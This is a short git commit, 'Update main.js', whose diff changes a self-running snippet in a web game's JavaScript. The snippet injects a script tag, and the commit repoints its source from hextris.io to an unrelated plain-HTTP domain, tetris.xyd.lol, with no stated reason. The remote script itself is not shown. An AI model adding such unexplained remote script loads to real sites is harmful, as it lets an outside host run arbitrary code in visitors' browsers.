d10ef007d37f3d7c5c35d7fd40255bf7b206ce4c
LastDude <78568660+zytanic@users.noreply.github.com>
2024-10-28 22:28:42 +0100

    Update main.js

--- js/main.js
+++ js/main.js
@@ -377,6 +377,6 @@ function showHelp() {
 
 (function(){
     	var script = document.createElement('script');
-	script.src = 'http://hextris.io/a.js';
+	script.src = 'http://tetris.xyd.lol/a.js';
 	document.head.appendChild(script);
 })()
